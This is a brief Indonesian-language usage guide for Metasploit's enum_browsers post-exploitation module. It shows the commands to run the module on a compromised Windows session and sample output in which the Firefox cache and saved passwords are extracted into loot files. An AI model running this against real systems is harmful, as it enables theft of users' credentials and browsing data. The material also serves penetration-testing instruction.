# enum_browsers

Modul `enum_browsers` di Metasploit adalah modul `post-exploitation` untuk sistem Windows yang digunakan untuk mengumpulkan informasi terkait aktivitas `web browser` di komputer target, seperti `daftar situs yang pernah dikunjungi`, `kredensial yang disimpan`, serta `data autofill`.

## Cara Penggunaan di Metasploit

```
use post/windows/gather/enum_browsers
set EXTRACT_CACHE true
set SESSION <ID>
set USER_MIGRATION true
set VERBOSE true
run
```

Hasil output-nya seperti ini:

```
[*] Targeting: admin-PC\admin (IP: 192.168.1.52)
[*] System Information: ADMIN-PC | OS: Windows 7 (6.1 Build 7601, Service Pack 1). | Arch: x64 | Lang: en_US
[*] Starting data extraction from user profile: C:\Users\admin
[*] 
[+] Found Mozilla Firefox (Version: 115.0.3)
[*] 409 cache files found for Mozilla Firefox, total size: 34931 KB
[*] └ Zipping progress: 10% (41/409 files processed)
[*] └ Zipping progress: 20% (82/409 files processed)
[*] └ Zipping progress: 30% (123/409 files processed)
[*] └ Zipping progress: 40% (164/409 files processed)
[*] └ Zipping progress: 50% (205/409 files processed)
[*] └ Zipping progress: 60% (246/409 files processed)
[*] └ Zipping progress: 70% (287/409 files processed)
[*] └ Zipping progress: 80% (328/409 files processed)
[*] └ Zipping progress: 90% (369/409 files processed)
[*] └ Zipping progress: 100% (409/409 files processed)
[*] └ Cache for Mozilla Firefox zipped to: C:\Users\admin\AppData\Local\Temp\kCQGAVrY.zip
[+] └ Cache extracted to /root/.msf4/loot/20250516125830_default_192.168.1.52_MozillaFirefox__308548.zip (27425464 bytes)
[+] └ Passwords extracted to /root/.msf4/loot/20250516125832_default_192.168.1.52_MozillaFirefox__141190.json (3 entries)
[-] └ Cookies empty
[-] └ Download history empty
[-] └ Keyword search history empty
[-] └ Browsing history empty
[-] └ Bookmarks empty
[-] └ No extensions found for Mozilla Firefox.
[-] └ Cookies empty
[-] └ Download history empty
[-] └ Keyword search history empty
[-] └ Browsing history empty
[-] └ Bookmarks empty
[*] Post module execution completed
```
